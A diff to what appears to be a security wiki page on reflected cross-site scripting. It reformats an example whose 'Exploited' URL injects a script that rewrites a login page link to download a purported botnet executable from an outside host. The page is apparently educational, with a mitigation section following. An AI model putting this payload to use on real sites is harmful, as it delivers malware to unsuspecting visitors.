@@ -47,8 +47,8 @@ Example Attack
 
 In the below example, we will override an enticing link on a site we have determined to be vulnerable to download our botnet client. The second link on the mysite login page is the login button. This example will download our botnet client to the user's computer. Since we're dealing with Windows in this example, we can add some additional testing code to test for common download locations on the users computer using ActiveX, and then use the Run method to run the executable. 
 
-Normal: `http://mysite.com/login.php?username=angrygoats&startPage=1`
-Exploited: `http://mysite.com/login.php?username=<script>window.onload=function(){var mylinks=document.getElementsByTagName("a");mylinks[1].href="http://meet-singles-now.ru/flash_playerupdate.exe";}</script>`
+- Normal: `http://mysite.com/login.php?username=angrygoats&startPage=1`
+- Exploited: `http://mysite.com/login.php?username=<script>window.onload=function(){var mylinks=document.getElementsByTagName("a");mylinks[1].href="http://meet-singles-now.ru/flash_playerupdate.exe";}</script>`
 
 Mitigation
 
